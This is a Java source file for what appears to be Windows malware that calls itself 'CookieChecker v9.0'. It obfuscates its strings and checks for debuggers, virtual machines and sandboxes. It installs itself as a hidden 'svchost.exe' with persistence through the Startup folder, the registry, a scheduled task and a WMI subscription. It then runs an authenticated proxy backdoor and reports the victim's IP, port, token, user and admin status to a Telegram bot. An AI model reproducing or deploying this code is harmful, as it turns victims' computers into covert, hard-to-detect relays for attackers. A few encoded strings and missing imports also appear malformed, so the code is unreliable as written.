import com.sun.jna.*;
import com.sun.jna.platform.win32.*;
import com.sun.jna.ptr.IntByReference;
import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.security.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.stream.Stream;
import java.lang.management.ManagementFactory;

public class Main {
    private static final Semaphore S = new Semaphore(50);
    private static final Object L = new Object();
    private static String F;
    private static int P;
    private static String T;
    private static final C Cts = new C();
    private static final String XOR_KEY = "S3cr3tK3y!";
  
    // Telegram Token Bot
    private static final String TOKEN = "";
    // Telegram Chat ID
    private static final String CHAT_ID = "";

    private static String dec(String enc) {
        try {
            byte[] data = Base64.getDecoder().decode(enc);
            byte[] key = XOR_KEY.getBytes(StandardCharsets.UTF_8);
            for (int i = 0; i < data.length; i++) data[i] ^= key[i % key.length];
            return new String(data, StandardCharsets.UTF_8);
        } catch (Exception e) { return enc; }
    }

    private interface K extends Library {
        K I = Native.load("kernel32", K.class);
        boolean IsDebuggerPresent();
        Pointer GetModuleHandle(String lpModuleName);
        Pointer GetProcAddress(Pointer hModule, String procName);
        boolean VirtualProtect(Pointer lpAddress, int dwSize, int flNewProtect, int[] lpflOldProtect);
        int GetTickCount();
        boolean SetFileAttributes(String lpFileName, int dwFileAttributes);
    }

    private interface N extends Library {
        N I = Native.load("ntdll", N.class);
        int NtQueryInformationProcess(Pointer h, int cls, PROCESS_BASIC_INFORMATION pbi, int len, int[] ret);
    }

    @Structure.FieldOrder({"Reserved1", "PebBaseAddress", "Reserved2_0", "Reserved2_1", "UniqueProcessId", "Reserved3"})
    public static class PROCESS_BASIC_INFORMATION extends Structure {
        public Pointer Reserved1;
        public Pointer PebBaseAddress;
        public Pointer Reserved2_0;
        public Pointer Reserved2_1;
        public Pointer UniqueProcessId;
        public Pointer Reserved3;
    }

    private static class C {
        private volatile boolean c = false;
        public boolean isCancellationRequested() { return c; }
        public void cancel() { c = true; }
    }

    public static void main(String[] args) throws Exception {
        int r = ThreadLocalRandom.current().nextInt(0, 10);
        switch (r) {
            case 0: break;
            case 1: if (System.currentTimeMillis() < 0) System.exit(0); break;
            case 2: for (int i = 0; i < 999999; i++) { int x = i * i; } break;
            default: if (r == 99) { System.out.println("dead code"); }
        }

        F = Paths.get(System.getenv(dec("TE9DQUxBUFBEQVRB")), dec("c3ZjaG9zdC5kYXQ=")).toString();

        if (a()) {
            l(dec("RU5WX0ZBSUw="));
            Thread.sleep(60000);
            System.exit(0);
        }
        if (b()) {
            l(dec("QU5BTFlTSVM="));
            Thread.sleep(30000);
            System.exit(0);
        }

        h();
        Thread.sleep(ThreadLocalRandom.current().nextInt(10000, 30000));

        if (!c()) {
            l(dec("SU5URUdSSVRZ"));
            System.exit(1);
        }

        i();
        j();
        l(dec("UFJFX1NFUlZJQ0U="));

        Thread t = new Thread(() -> k(Cts));
        t.start();

        l(dec("UFJFX1JFUE9SVA=="));
        m();
        l(dec("UE9TVF9SRVBPUlQ="));

        while (true) {
            Thread.sleep(10000);
            if (Cts.isCancellationRequested()) break;
        }
    }

    private static void h() { }

    private static void l(String msg) {
        synchronized (L) {
            try {
                Files.write(Paths.get(F),
                        ("[" + java.time.Instant.now() + "] " + msg + "\n").getBytes(StandardCharsets.UTF_8),
                        StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            } catch (IOException ignored) {}
        }
    }

    private static boolean a() {
        if (K.I.IsDebuggerPresent()) return true;
        try {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int[] ret = new int[1];
            N.I.NtQueryInformationProcess(null, 0, pbi, pbi.size(), ret);
            byte beingDebugged = pbi.PebBaseAddress.getByte(0x02);
            if (beingDebugged != 0) return true;
            int offset = System.getProperty(dec("b3MuYXJjaA==")).contains(dec("NjQ=")) ? 0xBC : 0x68;
            int flags = pbi.PebBaseAddress.getInt(offset);
            if ((flags & 0x70) != 0) return true;
        } catch (Exception ignored) {}

        long t1 = K.I.GetTickCount();
        int sink = 0;
        for (int i = 0; i < 2000000; i++) sink += i;
        long t2 = K.I.GetTickCount();
        if ((t2 - t1) > 800) return true;
        if (sink == Integer.MIN_VALUE) return false;

        String[] debuggers = {dec("eDY0ZGJn"), dec("eDMyZGJn"), dec("b2xseWRiZw=="), dec("aWRh"), dec("aWRhNjQ="), dec("Y2hlYXRlbmdpbmU="), dec("ZG5zcHk="), dec("aWxzcHk="), dec("ZGU0ZG90"), dec("cHJvY2Vzc2hhY2tlcg==")};
        try {
            ProcessBuilder pb = new ProcessBuilder(dec("dGFza2xpc3Q="), dec("L2Zv"), dec("Y3N2"), dec("L25o"));
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                String lower = line.toLowerCase();
                for (String d : debuggers) {
                    if (lower.contains(d)) return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static boolean b() {
        try {
            String[] vmSignatures = {dec("dm13YXJl"), dec("dmlydHVhbGJveA=="), dec("dmJveA=="), dec("cWVtdQ=="), dec("eGVu"), dec("b3JhY2xl"), dec("dmlydHVhbA=="), dec("cGFyYWxsZWxz"), dec("Ym9jaHM="), dec("aW5ub3Rlaw=="), dec("cmVkIGhhdA=="), dec("YW1hem9uIGVjMg==")};
            String manufacturer = q(dec("U0VMRUNUIE1hbnVmYWN0dXJlciBGUk9NIFdpbjMyX0NvbXB1dGVyU3lzdGVt")).toLowerCase();
            String cpu = q(dec("U0VMRUNUIE5hbWUgRlJPTSBXaW4zMl9Qcm9jZXNzb3I=")).toLowerCase();
            String bios = q(dec("U0VMRUNUIFNlcmlhbE51bWJlciBGUk9NIFdpbjMyX0JJT1M=")).toLowerCase();
            String model = q(dec("U0VMRUNUIE1vZGVsIEZST00gV2luMzJfQ29tcHV0ZXJTeXN0ZW0=")).toLowerCase();
            String gpu = q(dec("U0VMRUNUIE5hbWUgRlJPTSBXaW4zMl9WaWRlb0NvbnRyb2xsZXI=")).toLowerCase();
            for (String sig : vmSignatures) {
                if (manufacturer.contains(sig) || cpu.contains(sig) || bios.contains(sig) || model.contains(sig) || gpu.contains(sig))
                    return true;
            }

            String[] sandboxNames = {dec("c2FuZGJveA=="), dec("bWFsdGVzdA=="), dec("dmlydXM="), dec("c2FtcGxl"), dec("YW5hbHlzaXM="), dec("dGVzdC1wYw==")};
            String machineName = System.getenv(dec("Q09NUFVURVJOQU1F")) != null ? System.getenv(dec("Q09NUFVURVJOQU1F")).toLowerCase() : "";
            String userName = System.getenv(dec("VVNFUk5BTUU=")) != null ? System.getenv(dec("VVNFUk5BTUU=")).toLowerCase() : "";
            for (String s : sandboxNames) {
                if (machineName.contains(s) || userName.contains(s)) return true;
            }

            if (Runtime.getRuntime().availableProcessors() < 2) return true;

            long totalRam = 0;
            try {
                ProcessBuilder pb = new ProcessBuilder(dec("d21pYw=="), dec("Q29tcHV0ZXJTeXN0ZW0="), dec("Z2V0"), dec("VG90YWxQaHlzaWNhbE1lbW9yeQ=="), dec("L3ZhbHVl"));
                Process p = pb.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.toLowerCase().contains(dec("dG90YWxwaHlzaWNhbG1lbW9yeQ=="))) {
                        String val = line.split("=")[1].trim();
                        totalRam = Long.parseLong(val);
                        break;
                    }
                }
            } catch (Exception e) {}
            if (totalRam < 2L * 1024 * 1024 * 1024) return true;

            String diskStr = q(dec("U0VMRUNUIFNpemUgRlJPTSBXaW4zMl9EaXNrRHJpdmU="));
            if (!diskStr.isEmpty()) {
                try {
                    long diskSize = Long.parseLong(diskStr);
                    if (diskSize < 60L * 1024 * 1024 * 1024) return true;
                } catch (NumberFormatException ignored) {}
            }

            if (System.currentTimeMillis() / 60000 < 2) return true;

            String recentDir = System.getenv(dec("QVBQREFUQQ==")) + dec("XE1pY3Jvc29mdFxXaW5kb3dzXFJlY2VudA==");
            if (Files.exists(Paths.get(recentDir))) {
                try (Stream<Path> files = Files.list(Paths.get(recentDir))) {
                    if (files.count() < 5) return true;
                }
            }

            if (ProcessHandle.allProcesses().count() < 15) return true;

            String[] analysisTools = {dec("d2lyZXNoYXJr"), dec("ZmlkZGxlcg=="), dec("Y2hhcmxlcw=="), dec("cHJvY21vbg=="), dec("cmVnbW9u"), dec("ZmlsZW1vbg==")};
            for (ProcessHandle ph : ProcessHandle.allProcesses()) {
                String name = ph.info().command().map(Path::getFileName).map(Path::toString).orElse("").toLowerCase();
                for (String tool : analysisTools) {
                    if (name.contains(tool)) return true;
                }
            }
            return false;
        } catch (Exception e) { return false; }
    }

    private static String q(String query) {
        try {
            String[] parts = query.split(" ");
            if (parts.length < 4) return "";
            String select = parts[1];
            String from = parts[3];
            String rest = "";
            for (int i = 4; i < parts.length; i++) rest += " " + parts[i];
            List<String> cmd = new ArrayList<>();
            cmd.add(dec("d21pYw=="));
            cmd.add(dec("/bmFtZXNwYWNlOlxccm9vdFxjbW12Mg=="));
            cmd.add(dec("cGF0aA=="));
            cmd.add(from);
            cmd.add(dec("Z2V0"));
            cmd.add(select);
            if (!rest.isEmpty()) {
                cmd.add(dec("d2hlcmU="));
                cmd.add(rest.trim());
            }
            ProcessBuilder pb = new ProcessBuilder(cmd);
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            StringBuilder result = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty() && !line.toLowerCase().contains(dec("Y2xhc3M=")) && !line.contains(dec("PSI=")) && !line.startsWith(dec("SW5zdGFuY2VPZg=="))) {
                    result.append(line).append(" ");
                }
            }
            return result.toString().trim();
        } catch (Exception e) { return ""; }
    }

    private static void i() {
        String volumeSerial = q(dec("U0VMRUNUIFZvbHVtZVNlcmlhbE51bWJlciBGUk9NIFdpbjMyX0xvZ2ljYWxEaXNrIFdoZXJlIERldmljZUlEPUM6"));
        String macAddress = "";
        try {
            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (ni.isUp() && !ni.isLoopback()) {
                    byte[] mac = ni.getHardwareAddress();
                    if (mac != null) {
                        StringBuilder sb = new StringBuilder();
                        for (byte b : mac) sb.append(String.format("%02X", b));
                        macAddress = sb.toString();
                        break;
                    }
                }
            }
        } catch (Exception e) {}

        String userSid = "";
        try {
            ProcessBuilder pb = new ProcessBuilder(dec("d2hvYW1p"), dec("L3VzZXI="), dec("L2Zv"), dec("Y3N2"), dec("L25o"));
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            if (line != null) {
                String[] parts = line.split(",");
                if (parts.length > 1) userSid = parts[1].replace("\"", "").trim();
            }
        } catch (Exception e) {}

        String salt = volumeSerial + "|" + macAddress + "|" + userSid;
        try {
            Mac hmac = Mac.getInstance(dec("SE1BQ1NIQTI1Ng=="));
            SecretKeySpec keySpec = new SecretKeySpec(salt.getBytes(StandardCharsets.UTF_8), dec("SE1BQ1NIQTI1Ng=="));
            hmac.init(keySpec);
            byte[] tokenBytes = hmac.doFinal((dec("Y2hlY2tlcl9hcGlf") + System.getenv(dec("Q09NUFVURVJOQU1F")) + "_" + java.time.Year.now().getValue()).getBytes(StandardCharsets.UTF_8));
            T = Base64.getEncoder().encodeToString(tokenBytes).substring(0, 32);
        } catch (Exception e) { T = dec("dW5rbm93bg=="); }

        P = n();
        l(dec("SU5JVDog") + P);
    }

    private static int n() {
        try (ServerSocket socket = new ServerSocket(0)) { return socket.getLocalPort(); } 
        catch (IOException e) { return ThreadLocalRandom.current().nextInt(49152, 65535); }
    }

    private static void j() {
        int successCount = 0;
        String appData = System.getenv(dec("QVBQREFUQQ=="));
        String targetPath = Paths.get(appData, dec("TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtcyxTdGFydHVwXHN2Y2hvc3QuZXhl")).toString();
        String currentExe = ProcessHandle.current().info().command().orElse("");

        try {
            File target = new File(targetPath);
            if (!target.exists() || target.length() != new File(currentExe).length()) {
                Files.copy(Paths.get(currentExe), Paths.get(targetPath), StandardCopyOption.REPLACE_EXISTING);
                ProcessBuilder pb = new ProcessBuilder(dec("YXR0cmli"), dec("K0g="), dec("K1M="), targetPath);
                pb.start().waitFor();
                successCount++;
            }
        } catch (Exception e) { l(dec("UDE6") + e.getMessage()); }

        try {
            ProcessBuilder pb = new ProcessBuilder(dec("cmVn"), dec("YWRk"), dec("SENVXFxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4="),
                    dec("L3Y="), dec("U3ZjSG9zdDMy"), dec("L3Q="), dec("UkVHX1Na"), dec("L2Q="), "\"" + targetPath + "\"", dec("L2Y="));
            Process p = pb.start();
            p.waitFor(5, TimeUnit.SECONDS);
            if (p.exitValue() == 0) successCount++;
        } catch (Exception e) { l(dec("UDI6") + e.getMessage()); }

        if (o()) {
            try {
                ProcessBuilder pb = new ProcessBuilder(dec("c2NodGFza3M="), dec("L2NyZWF0ZQ=="), dec("/dG4="), dec("U3ZjSG9zdDMy"), dec("/dHI="), "\"" + targetPath + "\"", dec("L3Nj"), dec("b25sb2dvbg=="), dec("L3Js"), dec("aGlnaGVzdA=="), dec("L2Y="));
                Process p = pb.start();
                p.waitFor(5, TimeUnit.SECONDS);
                if (p.exitValue() == 0) successCount++;
            } catch (Exception e) { l(dec("UDM6") + e.getMessage()); }

            try {
                String filter = dec("d21pYyAvTkFNRVNQQUNFOlxccm9vdFxzdWJzY3JpcHRpb24gUEFUSCBfX0V2ZW50RmlsdGVyIENSRUFURSBOYW1lPSJTRiIsIEV2ZW50TmFtZXNwYWNlPSJyb290XGNpbXYyIiwgUXVlcnlMYW5ndWFnZT0iV1FMIiwgUXVlcnk9IlNFTEVDVCAqIEZST00gX19JbnN0YW5jZU1vZGlmaWNhdGlvbkV2ZW50IFdJVEhJTiA2MCBXSEVSRSBUYXJnZXRJbnN0YW5jZSBJU0EgJ1dpbjMyX1BlcmZvcm1hdGFkRGF0YV9QZXJmb3NPU19TeXN0ZW0nIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPj0gMjAwIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPCAzMjAi");
                String consumer = dec("d21pYyAvTkFNRVNQQUNFOlxccm9vdFxzdWJzY3JpcHRpb24gUEFUSCBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgQ1JFQVRFIE5hbWU9IlNDIiwgRXhlY3V0YWJsZVBhdGg9Ig==") + targetPath + dec("IiwgQ29tbWFuZExpbmVUZW1wbGF0ZT0i") + targetPath + "\"";
                String binding = dec("d21pYyAvTkFNRVNQQUNFOlxccm9vdFxzdWJzY3JpcHRpb24gUEFUSCBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nIENSRUFURSBGaWx0ZXI9Il9fRXZlbnRGaWx0ZXIuTmFtZT0nU0YnIiwgQ29uc3VtZXI9IkNvbW1hbmRMaW5lRXZlbnRDb25zdW1lci5OYW1lPSdTQyci");
                r(filter);
                r(consumer);
                r(binding);
                successCount++;
            } catch (Exception e) { l(dec("UDQ6") + e.getMessage()); }
        }
        l(dec("UEVSU0lTVDog") + successCount + "/4");
    }

    private static void r(String command) {
        try {
            ProcessBuilder pb = new ProcessBuilder(dec("Y21kLmV4ZQ=="), dec("L2M="), command);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor(10, TimeUnit.SECONDS);
        } catch (Exception e) { l(dec("Q01ERVJS") + e.getMessage()); }
    }

    private static void k(C cts) {
        ServerSocket serverSocket = null;
        ExecutorService pool = Executors.newFixedThreadPool(50);
        try {
            serverSocket = new ServerSocket(P);
            l(dec("U0VSVklDRTog") + P);
            while (!cts.isCancellationRequested()) {
                try {
                    Socket client = serverSocket.accept();
                    pool.submit(() -> {
                        try { p(client, cts); } catch (Exception ignored) {}
                        finally { try { client.close(); } catch (IOException ignored) {} }
                    });
                } catch (IOException e) {
                    if (cts.isCancellationRequested()) break;
                    l(dec("QUNDRVBUOiA=") + e.getMessage());
                }
            }
        } catch (Exception e) { l(dec("U0VSVklDRV9FUlI6") + e.getMessage()); }
        finally {
            if (serverSocket != null) try { serverSocket.close(); } catch (IOException ignored) {}
            pool.shutdownNow();
        }
    }

    private static void p(Socket client, C cts) {
        try (Socket socket = client) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            String requestLine = reader.readLine();
            if (requestLine == null) return;

            Map<String, String> headers = new HashMap<>();
            String line;
            while ((line = reader.readLine()) != null && !line.isEmpty()) {
                int idx = line.indexOf(':');
                if (idx > 0) headers.put(line.substring(0, idx).trim().toLowerCase(), line.substring(idx + 1).trim());
            }

            if (!headers.containsKey(dec("cHJveHktYXV0aG9yaXphdGlvbg==")) || !headers.get(dec("cHJveHktYXV0aG9yaXphdGlvbg==")).contains(T)) {
                s(writer, dec("NDA3IFByb3h5IEF1dGhlbnRpY2F0aW9uIFJlcXVpcmVk"));
                return;
            }

            String[] parts = requestLine.split(" ");
            if (parts.length < 2) return;
            String method = parts[0].toUpperCase();
            String target = parts[1];

            if (method.equals(dec("Q09OTkVDVA=="))) {
                String[] hostPort = target.split(":");
                String host = hostPort[0];
                int port = hostPort.length > 1 ? Integer.parseInt(hostPort[1]) : 443;
                try (Socket upstream = new Socket(host, port)) {
                    s(writer, dec("MjAwIENvbm5lY3Rpb24gRXN0YWJsaXNoZWQ="));
                    t(socket, upstream);
                } catch (IOException e) { l(dec("Q09OTkVDVF9FUlI6") + e.getMessage()); }
            } else {
                URI uri;
                try { uri = new URI(target); } catch (URISyntaxException e) { s(writer, dec("NDAwIEJhZCBSZXF1ZXN0")); return; }
                String host = uri.getHost();
                int port = uri.getPort() > 0 ? uri.getPort() : 80;
                try (Socket upstream = new Socket(host, port)) {
                    String rewritten = method + " " + (uri.getPath() + (uri.getQuery() != null ? "?" + uri.getQuery() : "")) + " HTTP/1.1\r\n";
                    OutputStream upstreamOut = upstream.getOutputStream();
                    upstreamOut.write(rewritten.getBytes(StandardCharsets.US_ASCII));
                    for (Map.Entry<String, String> entry : headers.entrySet()) {
                        if (!entry.getKey().equals(dec("cHJveHktYXV0aG9yaXphdGlvbg=="))) {
                            upstreamOut.write((entry.getKey() + ": " + entry.getValue() + "\r\n").getBytes(StandardCharsets.US_ASCII));
                        }
                    }
                    upstreamOut.write("\r\n".getBytes(StandardCharsets.US_ASCII));
                    upstreamOut.flush();
                    t(socket, upstream);
                } catch (IOException e) { l(dec("SFRUUF9FUlI6") + e.getMessage()); }
            }
        } catch (Exception e) { l(dec("UkVRVUVTVDo=") + e.getMessage()); }
    }

    private static void s(BufferedWriter writer, String status) throws IOException {
        writer.write("HTTP/1.1 " + status + "\r\n");
        writer.write("Proxy-Agent: Mozilla/5.0\r\n\r\n");
        writer.flush();
    }

    private static void t(Socket a, Socket b) {
        Thread t1 = new Thread(() -> u(a, b));
        Thread t2 = new Thread(() -> u(b, a));
        t1.start();
        t2.start();
        try { t1.join(); t2.join(); } catch (InterruptedException ignored) {}
    }

    private static void u(Socket from, Socket to) {
        try (InputStream in = from.getInputStream(); OutputStream out = to.getOutputStream()) {
            byte[] buffer = new byte[16384];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
                out.flush();
            }
        } catch (IOException ignored) {}
    }

    private static void sendTelegram(String message) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            JSONObject payload = new JSONObject();
            payload.put("chat_id", CHAT_ID);
            payload.put("text", message);
            payload.put("parse_mode", "Markdown");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
            }
            conn.getResponseCode();
        } catch (Exception ignored) {}
    }

    private static void m() {
        try {
            String publicIp = v();
            String localIp = w();
            String hostname = System.getenv(dec("Q09NUFVURVJOQU1F"));
            String username = System.getenv(dec("VVNFUk5BTUU="));
            boolean isAdmin = o();
            long uptimeMinutes = (System.currentTimeMillis() - ManagementFactory.getRuntimeMXBean().getStartTime()) / 60000;

            String msg = "📡 *CookieChecker v9.0*\n" +
                         "IP: `" + publicIp + "`\n" +
                         "LAN: `" + localIp + "`\n" +
                         "Port: `" + P + "`\n" +
                         "Token: `" + T + "`\n" +
                         "Host: `" + hostname + "`\n" +
                         "User: `" + username + "`\n" +
                         "Uptime: `" + uptimeMinutes + "m`\n" +
                         "Admin: `" + (isAdmin ? "✅" : "❌") + "`";

            sendTelegram(msg);
            l(dec("V0VCSE9PSzog") + "OK");
        } catch (Exception e) {
            l(dec("UkVQT1JUOiA=") + e.getMessage());
        }
    }

    private static boolean o() {
        try {
            ProcessBuilder pb = new ProcessBuilder(dec("bmV0"), dec("c2Vzc2lvbg=="));
            Process p = pb.start();
            return p.waitFor() == 0;
        } catch (Exception e) { return false; }
    }

    private static String v() {
        String[] endpoints = {dec("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn"), dec("aHR0cHM6Ly9pY2FuaGF6aXAuY29t"), dec("aHR0cHM6Ly9pZmNvbmZpZy5tZS9pcA==")};
        for (String endpoint : endpoints) {
            try {
                URL url = new URL(endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                if (conn.getResponseCode() == 200) {
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                        return reader.readLine().trim();
                    }
                }
            } catch (Exception ignored) {}
        }
        return dec("MC4wLjAuMA==");
    }

    private static String w() {
        try {
            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (ni.isUp() && !ni.isLoopback()) {
                    for (InetAddress addr : Collections.list(ni.getInetAddresses())) {
                        if (addr instanceof Inet4Address) return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {}
        return dec("MTI3LjAuMC4x");
    }

    private static boolean c() {
        try {
            String exePath = ProcessHandle.current().info().command().orElse("");
            byte[] hash = MessageDigest.getInstance(dec("U0hBLTI1Ng==")).digest(Files.readAllBytes(Paths.get(exePath)));
            return hash.length == 32 && hash[0] != 0;
        } catch (Exception e) {
            l(dec("VkVSSUZZOiA=") + e.getMessage());
            return false;
        }
    }
}
